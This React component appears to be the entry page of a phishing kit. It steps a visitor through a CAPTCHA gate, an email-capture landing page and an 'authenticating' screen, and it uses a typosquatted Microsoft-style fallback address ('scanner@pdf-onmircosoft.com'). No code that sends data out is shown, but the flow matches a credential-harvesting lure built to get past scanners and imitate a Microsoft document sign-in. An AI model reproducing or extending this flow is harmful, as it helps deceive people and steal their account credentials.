import { useState } from "react";
import LandingPage from "@/components/LandingPage";
import CaptchaPage from "@/components/CaptchaPage";
import AuthenticatingPage from "@/components/AuthenticatingPage";

type PageState = "landing" | "captcha" | "authenticating";

const Index = () => {
  const [currentPage, setCurrentPage] = useState<PageState>("captcha");
  const [email, setEmail] = useState("");

  const handleEmailSubmit = (submittedEmail: string) => {
    setEmail(submittedEmail);
    setCurrentPage("authenticating");
  };

  const handleCaptchaVerify = () => {
    setCurrentPage("landing");
  };

  const handleAuthenticatingComplete = () => {
    setCurrentPage("landing");
  };

  return (
    <>
      {currentPage === "landing" && (
        <LandingPage onSubmit={handleEmailSubmit} />
      )}
      {currentPage === "captcha" && (
        <CaptchaPage onVerify={handleCaptchaVerify} />
      )}
      {currentPage === "authenticating" && (
        <AuthenticatingPage email={email || "scanner@pdf-onmircosoft.com"} />
      )}
    </>
  );
};

export default Index;
